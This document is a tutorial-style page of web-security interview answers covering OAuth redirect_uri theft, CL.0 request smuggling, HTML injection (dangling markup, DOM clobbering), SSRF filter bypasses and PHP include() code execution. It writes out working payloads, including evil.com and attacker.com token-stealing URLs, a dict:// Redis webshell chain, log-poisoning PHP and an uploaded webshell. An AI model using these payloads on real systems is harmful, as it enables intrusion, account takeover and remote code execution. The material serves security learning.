
# Linkedin QnA 
---
## Question 56: What are some common OAuth 2.0 flaws & misconfigurations?

https://portswigger.net/web-security/oauth

**redirect_uri bypass**

`code`, which haves the authorization code is appended behind the URI, which means that if an attacker can change the URI, it will also leak the `code` to the attacker. If successful, it can lead to Account takover.

**examples:**
Open redirect -> `/callback?client_id=1337&redirect_uri=https://evil.com`<br>
https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

**Host header poisoning** 
- This really interesting idea was I believe invented by ngalog. He edited the `Host` header to this : 
```
Host: attacker.com/vulnerable-site.com 
```
which confused the `redirect_uri` and it actually made a request to attacker.com

H1 report : https://hackerone.com/reports/317476

**Interesting:** https://portswigger.net/research/hidden-oauth-attack-vectors
Make sure to read this research paper, as it contains a lot of useful info about Oauth, you will learn a lot.


## Question 57: Describe the CL.0 variant of HTTP Request Smuggling and how it differs from standard variants (e.g. CL.TE).

The CL.0 variant exploits the fact that the back-end server ignores the `Content-Length` entirely and assumes the end of the request is at the end of headers. `CL.0`, because it is an equivalent to `Content-Length: 0`.

**Example :**
We make a simple POST request, like this :
```HTTP
POST / HTTP/1.1
Host: freeoscp.net
Content-Length: 1

xGET / HTTP/1.1
Host: freeoscp.net
```
The front-end uses the `Content-Length`, but back-end couldn't care less about it, so the back-end treats the start of the POST body as a new request, and the response will be like :

```HTTP
HTTP/1.1 405 Method Not Allowed

"What is xGET?????"
```


CL.0 differs from traditional HRS, because instead of abusing the logic behind how both CL and TE headers are treated (CL.TE & TE.CL), it just exploits CL header which only the front-end uses.

## Question 58: Name some potential ways to exploit HTML Injection.

### HTMLi -> XSS
One of the most common way to escalate HTML injection is XSS. Instead of just getting, for example, hyperlink injection, we can actually execute javascript! Yeah well I don't really know what to write here, so let's move onto some advanced techniques.


##### 1) Dangling markup
When XSS is impossible but we still get HTML injection and can use special chars like `">`, we can try a technique called "Dangling markup". The idea is that we make a html tag pointing to our domain and left unclosed, like : `"><img src='hackerman.com?`. Since the attribute continues, it will try to find the closing `'`. Until then, the whole response after the tag can be seen for us. The impact can be nothing, or CSRF token steal - it depends on what is stored in the source code.

Learn here : https://portswigger.net/web-security/cross-site-scripting/dangling-markup

**Note** : Dangling markup no longer works on Chrome, since it now blocks newlines, angle brackets and other raw characters in URLs definitons (like in `<img src="here">`)

##### 2) DOM clobbering (I copied this from websec questions, sorry)
Dom clobbering is technique that is used, when there's no possible JS injection, but there's still HTML injection.

It can be used, when we have a control over something that has `id` or `name` attribute, consider this example : 

```html
<script> window.onload = function(){ 
	let someObject = window.someObject || {}; 
	let script = document.createElement('script'); 
	script.src = someObject.url; 
	document.body.appendChild(script); }; 
</script>
```

We can exploit this by making two anchor tags with the same id :
`<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>`
The DOM will now add them to DOM collection, where the `name` attribute is used on the LAST anchor tag, leading it to the external script.
<sub>source: https://portswigger.net/web-security/dom-based/dom-clobbering</sub>

I need to admit that I lack knowledge in this advanced stuff, but I can definitely recommend this wiki : https://domclob.xyz/domc_wiki/index, which only focuses on DOM clobbering.

Also https://tib3rius.com/dom/ of course :P


### Limited Web Defacement + Phishing
If we can't escalate HTML injection to XSS, we still can do a damage to the target. Note, that as with XSS, there's reflected and stored HTML injection. If we have a stored HTML injection, we could somehow deface the website, although not as perfectly as if we could use `<script>` tag. Phishing is also possible.

**Background image change**
```html
<style>
div {
 background-image: url('https://freeoscp.net/give-oscp-for-free.jpg');
}
</style>
```

**Fake button**
```html
<button style="some css here if possible">Click here for free robux</button>
```

**Automatic redirect**
- It's possible without JS to redirect you instantly to a new website via `meta` tag. If stored, it can be really annoying for normal users.
```html
<meta http-equiv="refresh" content="2; https://malware-install.org"
```


## Question 59: Describe some methods for bypassing SSRF detection filters.

##### 1) DNS rebinding
An advanced technique to bypass SSRF filters. When private IPs are in blacklist, it can be bypassed by using a domain with a very low TTL and having two IPs, when one of them is whitelisted & the second is blacklisted (the private IP we want to infiltrate).

**TTL = Time-To-Live**
- Tells the DNS resolver for how long the query (IP address in our case) is cached, before making a new request. 

I will introduce you to an amazing tool, that will help you with DNS rebinding attacks : <a href="https://github.com/taviso/rbndr">rbndr</a>
This tool helps us in the process of making (sub)domain, that point randomly between 2 IP addresses, with very low TTL. The usage is very simple, check the image below :
 <img src="https://anopic.ag/3oHEJjKEtIGhruT4TyMXsk49hXqwn77P7i7mpSpo.jpg"><br>
`First IP` - IP that is not blacklisted.<br>
`Second IP` - The IP we want to access, can be any private IP, localhost, EC2 IP,...<br>
`The domain` - The generated domain that we will use against the target.<br>
Note that it doesn't matter if the first IP will be the one we want to infiltrate, or non-blacklisted one.<br>


After creating a domain, we can actually check how it works. On linux, you can simply use `host <hostname>` command, whereas on windows, `nslookup <hostname>` works just fine.


```
> nslookup 08080808.7f000001.rbndr.us
Non-authoritative answer:
Name:    08080808.7f000001.rbndr.us
Address:  8.8.8.8

> nslookup 08080808.7f000001.rbndr.us
Name:    08080808.7f000001.rbndr.us
Address:  127.0.0.1

> nslookup 08080808.7f000001.rbndr.us
Name:    08080808.7f000001.rbndr.us
Address:  127.0.0.1

> nslookup 08080808.7f000001.rbndr.us
Name:    08080808.7f000001.rbndr.us
Address:  8.8.8.8
```

So as we can see here, we've firstly got `8.8.8.8`, then `127.0.0.1` twice, and then again `8.8.8.8`. So this confirms it indeed works and now the only thing we need to do, is to try it against the "vulnerable" application and see if it works! (Make sure to spam the HTTP request, one request is not enough)


##### 2) URL format bypass
Even if SSRF check is in place, it can be coded poorly, which can easily lead to bypass. One of the most common bypasses are URL format bypasses, where we simply try to change the IP to a "different", but actually the same IP. 

**INFO**: Lot of people think that localhost is only `127.0.0.1`, which is false. Localhost is actually `127.x.x.x`

So let's have a look at some bypasses for `127.0.0.1`:
```
127.x.x.x #CIDR bypass
http://127.1
http://[::] #IPv6
http://2130706433/ #Decimal bypass (translates to 127.0.0.1)
http://0x7f000001/ #Hexadecimal bypass (translates to 127.0.0.1)
127.000000000000.1 #Add whatever number of zeros.
```
I could continue, but it will be better if I share a resource, where you can see more : <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass">HackTricks</a>

**Domain bypass example**
Let's suppose we have an application, where `localhost` is blocked, but it is done via insecure way :

```js
if url isExactly("localhost") {
	write("Go away!")
	//report to the police
} else {
	write("Here are files : ")
}
```
This really wonderful pseudocode shows the interesting `isExactly`, which basically tells us that only the `localhost` is blocked, but will `randomlocalhost` be blocked? Nope. Bypassed.

##### 3) Different protocols
We shouldn't forget to use different protocols as well. Let's say the protection for the HTTP(S) protocol is insane and cannot be bypassed. What now? Well, try different protocols! The protection may not expect different protocol other than HTTP and will simply collapse. Protocols you might try : 

`file:///` - Will load local files. 
`gopher://` - A little bit more complicated protocol, but can actually be used for an RCE.
- https://github.com/tarunkant/Gopherus
`dict://` - `?url=dict://hackerman:1337/`
- DICT protocol can be used to create a webshell via REDIS as well :
```txt
# setting the root directory
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html

#creating a file webshell.php
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20webshell.php

# creating a webshell payload
dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[cmd])\x3F>"

# saving it
dict://127.0.0.1:6379/SAVE

Now, just go to target.com/webshell.php?cmd=id and ez pwn.
```


## Question 60: Describe different ways a PHP include() could be exploited to gain code execution.

#### Log poisoning
Let's say we've found a vulnerable parameter `page`, and we can successfully load `/etc/passwd`. Log Poisoning takes advantage over the fact that logs often reflect important data, like **headers**. In our example, let's focus on an nginx-based webserver, in which we will exploit the `access.log` file.

Full path is `/var/log/nginx/access.log.` We will make a request to it to confirm it exists :

```HTTP
GET /?page=../../../../var/log/nginx/access.log HTTP/1.1
Host: freeoscp.net
...
...

200 OK
1.3.3.7 - [28/Feb/2019:13:17:10 +0000] "GET /?p=1 HTTP/2.0" 200 5316 "https://freeoscp.net/?page=../../../../var/log/nginx/access.log" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/987948984.984 Safari/537.36" "2.75"
...
...
```
We confirm it exists. Now, we can see that it reflects a `User-Agent` header, so we can change our User-Agent header to a PHP code and see, if it works : 
```HTTP
GET /?page=../../../../var/log/nginx/access.log HTTP/1.1
Host: freeoscp.net
User-Agent: <?php system('id')
...
...
```

The response : 
```HTTP
200 OK 
1.3.3.7 - [28/Feb/2019:13:17:10 +0000] "GET /?p=1 HTTP/2.0" 200 5316 "https://freeoscp.net/?page=../../../../var/log/nginx/access.log" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/987948984.984 Safari/537.36" "2.75"
1.3.3.7 - [28/Feb/2019:13:17:10 +0000] "GET /?p=1 HTTP/2.0" 200 5316 "https://freeoscp.net/?page=../../../../var/log/nginx/access.log" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/987948984.984 Safari/537.36" "2.75"
1.3.3.7 - [28/Feb/2019:13:17:10 +0000] "GET /?p=1 HTTP/2.0" 200 5316 "https://freeoscp.net/?page=../../../../var/log/nginx/access.log" "uid=1000(secure) gid=1000(secure) groups=1000(secure),4(adm),27(sudo)......" "2.75"
```
`uid=1000(secure) gid=1000(secure) groups=1000(secure),4(adm),27(sudo)......`

This isn't tied to only the `access.log`, you could also abuse `error.log`, `ssh logs`, different frameworks like Apache, linux logs like `/proc/self/environ` and so on.
#### PHP wrappers & filter chain (copied from websec answers)

Now, one of the interesting PHP wrappers for us, that would allow us to EXECUTE code, is the
`expect://` wrapper.
- Is not enabled by default and is rare
- syntax is trivial - `expect://ls` executes the `ls` command.

`data://` - <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-data">Exploitation</a><br>
`input://` - <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-input">Exploitation</a><br>

And now for the better part -> Using PHP filter chain.

https://github.com/synacktiv/php_filter_chain_generator
This tool generates us from a php code specified the filter payload. The syntax is simple : 
`$ python3 php_filter_chain_generator.py --chain '<php code here>'`


I ain't no expert of why it works, but will add this later, for now you can read an article about it here : 
https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it

#### File upload + LFI
If we have a vulnerable file upload, we can simply upload a file with a webshell payload and then include it via the LFI exploit.

Let's say we upload a `shell.jpg`, with `<?php system($_GET['cmd']); ?>` contents. The file upload only check the extension and nothing else. Now, loading it standardly will just show the contents of the file, but via the LFI, we could actually get the shell to execute. We could simply request
`https://freeoscp.net?page=/path/to/shell/shell.jpg?cmd=id` and get command execution.





